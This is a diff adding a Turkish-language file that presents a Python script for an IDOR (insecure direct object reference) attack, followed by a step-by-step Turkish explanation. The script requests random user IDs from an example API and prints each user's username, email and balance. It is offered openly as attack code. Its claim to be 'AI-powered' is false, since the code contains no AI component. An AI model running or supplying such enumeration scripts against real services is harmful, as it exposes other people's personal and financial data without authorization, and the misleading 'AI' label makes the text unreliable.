@@ -1,0 +1,36 @@
+PYTHON KULLANARAK YAPAY ZEKAYLA İDOR SALDIRISI YAPMAK
+# İDOR saldırısı yapmak için yapay zekalı bir kod
+# Gerekli kütüphaneleri içe aktar
+import requests
+import json
+import random
+# Hedef URL'yi tanımla
+target_url = "https://example.com/api/v1/users/"
+# Saldırı için kullanılacak rastgele kullanıcı kimlikleri oluştur
+user_ids = random.sample(range(1, 1000), 10)
+# Her kullanıcı kimliği için bir istek yap
+for user_id in user_ids:
+    # URL'yi kullanıcı kimliği ile birleştir
+    url = target_url + str(user_id)
+    # İsteği gönder ve yanıtı al
+    response = requests.get(url)
+    # Yanıtı JSON olarak ayrıştır
+    data = json.loads(response.text)
+    # Yanıttan ilgili bilgileri al
+    username = data["username"]
+    email = data["email"]
+    balance = data["balance"]
+    # Bilgileri ekrana yazdır
+    print(f"User ID: {user_id}")
+    print(f"Username: {username}")
+    print(f"Email: {email}")
+    print(f"Balance: {balance}")
+    print("-" * 20)
+Bu kod, İDOR saldırısı yapmak için yapay zekalı bir koddur. İDOR saldırısı, bir web uygulamasının kullanıcı kimlik doğrulamasını veya yetkilendirmesini doğru şekilde yapmadığı zaman, bir saldırganın başka kullanıcıların verilerine erişmesine veya değiştirmesine izin veren bir güvenlik açığıdır. Bu kod, aşağıdaki adımları izler:
+- Gerekli kütüphaneleri içe aktarır. Bu kütüphaneler, web istekleri yapmak, JSON verilerini ayrıştırmak ve rastgele sayılar üretmek için kullanılır.
+- Hedef URL'yi tanımlar. Bu URL, web uygulamasının kullanıcı verilerini sağladığı API'nin adresidir.
+- Saldırı için kullanılacak rastgele kullanıcı kimlikleri oluşturur. Bu kimlikler, 1 ile 1000 arasında rastgele seçilen 10 sayıdır.
+- Her kullanıcı kimliği için bir istek yapar. Bu istek, URL'nin sonuna kullanıcı kimliğini ekleyerek yapılır. Örneğin, kullanıcı kimliği 123 ise, istek https://example.com/api/v1/users/123 adresine yapılır.
+- İsteği gönderir ve yanıtı alır. Yanıt, JSON formatında kullanıcı verilerini içerir. Örneğin, kullanıcı adı, e-posta, bakiye gibi bilgiler.
+- Yanıttan ilgili bilgileri alır ve ekrana yazdırır. Bu bilgiler, saldırganın başka kullanıcıların verilerini ele geçirmesini sağlar.
+Bu kodun amacı, web uygulamasının güvenliğini test etmek veya kırmak için kullanılmaktır.
